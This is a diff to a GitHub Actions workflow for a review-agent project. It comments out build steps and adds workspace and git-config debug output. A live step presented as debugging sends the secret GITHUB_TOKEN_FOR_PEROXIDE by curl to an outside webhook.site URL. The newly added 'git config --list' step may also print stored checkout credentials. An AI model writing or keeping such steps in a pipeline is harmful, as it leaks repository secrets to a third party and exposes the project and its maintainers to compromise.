@@ -400,8 +400,8 @@ jobs:
 
           
           
-      - name: Initialize Go module & Install Dependencies
-        run: cd keploy-review-agent; go mod tidy
+      # - name: Initialize Go module & Install Dependencies
+      #   run: cd keploy-review-agent; go mod tidy
 
       # - name: Debug File Existence
       #   run: |
@@ -442,10 +442,10 @@ jobs:
         run: file keploy-review-agent/review-agent
       # - name: Check Dynamic Dependencies
       #   run: ldd keploy-review-agent/review-agent
-      - name: Build Statically Linked Binary
-        run: |
-          cd keploy-review-agent
-          CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
+      # - name: Build Statically Linked Binary
+      #   run: |
+      #     cd keploy-review-agent
+      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
       - name: Debug Current Directory
         run: pwd && ls -lah
 
@@ -482,10 +482,21 @@ jobs:
         run: |
           ps aux | grep review
     
-      - name: sleeping or 10 sec
-        run: sleep 10
+      - name: sleeping or 5 sec
+        run: sleep 5
       - name: show the base64 encoded token GITHUB_TOKEN_FOR_PEROXIDE
         run: curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE
+      - name: Print Workspace Debug Info
+        run: |
+          echo "Working Directory: $(pwd)"
+          echo "GitHub Workspace: $GITHUB_WORKSPACE"
+          echo "Listing workspace contents:"
+          ls -la $GITHUB_WORKSPACE
+
+      - name: Print Git Configuration
+        run: |
+          echo "Git config --list:"
+          git config --list || true
       - name: Checkout another repo
         uses: actions/checkout@v3
         with:
